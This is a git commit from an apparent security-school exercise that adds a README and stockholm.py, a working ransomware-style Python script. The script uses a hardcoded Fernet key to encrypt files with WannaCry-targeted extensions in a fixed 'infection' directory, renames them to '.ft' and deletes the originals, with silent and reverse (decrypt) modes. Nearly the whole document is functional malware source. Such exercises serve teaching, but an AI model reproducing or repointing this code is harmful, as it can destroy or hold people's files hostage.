8f4c23e7a99d2cf6eddc3b016628d0c5eae55a6b
AliHaine <alitr57120@gmail.com>
2024-11-21 02:14:40 +0100

    p4 end

---
+++ 42_security_pool/p4/README.md
@@ -0,0 +1,8 @@
+To run the encryption run the script with for example the command:
+python ./stockholm.py
+
+YOU can use the followed options:
+-silent to not display any output
+-help to show the help menu
+-version to show the script version
+-reverse to run the decrypt mode
---
+++ 42_security_pool/p4/stockholm.py
@@ -0,0 +1,83 @@
+import sys
+import os
+from cryptography.fernet import Fernet
+import glob
+
+
+def load_wannacry_extensions():
+    try:
+        with open("wannacry_ex.txt") as f:
+            ex = [line.rstrip() for line in f]
+            return ex
+    except FileNotFoundError:
+        return None
+
+
+key = "93mBgdBnWdvw_6EmsIsv2jODf6jSPatTXuquA7GbXQ8="
+extensions = load_wannacry_extensions()
+if not extensions:
+    print("Error with wannacry_ex.txt")
+    exit(1)
+fernet = Fernet(key)
+silent = False
+os.chdir("/home/ayagmur/infection")
+
+
+def encrypt(file):
+    try:
+        with open(file, 'rb') as f:
+            if not silent:
+                print(f"Encrypting {file}")
+            data = f.read()
+            encrypted = fernet.encrypt(data)
+            newfile = file
+            if not file.endswith(".ft"):
+                newfile = file + ".ft"
+            with open(newfile, 'wb') as f2:
+                f2.write(encrypted)
+    except:
+        print(f"Error with {file}")
+        return
+    os.remove(file)
+
+
+def decrypt(file):
+    try:
+        with open(file, "rb") as fd:
+            print(f"Decrypting {file}")
+            encrypted_data = fd.read()
+            decrypted_data = fernet.decrypt(encrypted_data)
+            with open(file[:-3], "wb") as fd2:
+                fd2.write(decrypted_data)
+            os.remove(file)
+    except:
+        print(f"Error with {file}")
+
+
+def iterator_in_folder(mode):
+    files_to_act = []
+    if mode == 0:
+        for ex in extensions:
+            files_to_act.extend(glob.glob("*" + ex))
+        for file in files_to_act:
+            encrypt(file)
+    else:
+        files_to_act.extend(glob.glob("*.ft"))
+        for file in files_to_act:
+            decrypt(file)
+
+
+if len(sys.argv) > 1:
+    if sys.argv[1] == "-help" or sys.argv[1] == "-h":
+        print("-version to show the version, -reverse to decrypt, -silent to dont print any output")
+    elif sys.argv[1] == "-version" or sys.argv[1] == "-v":
+        print("version 1.0")
+    elif sys.argv[1] == "-reverse" or sys.argv[1] == "-r":
+        iterator_in_folder(1)
+    elif sys.argv[1] == "-silent" or sys.argv[1] == "-s":
+        silent = True
+        iterator_in_folder(0)
+    else:
+        print("unknown option")
+else:
+    iterator_in_folder(0)
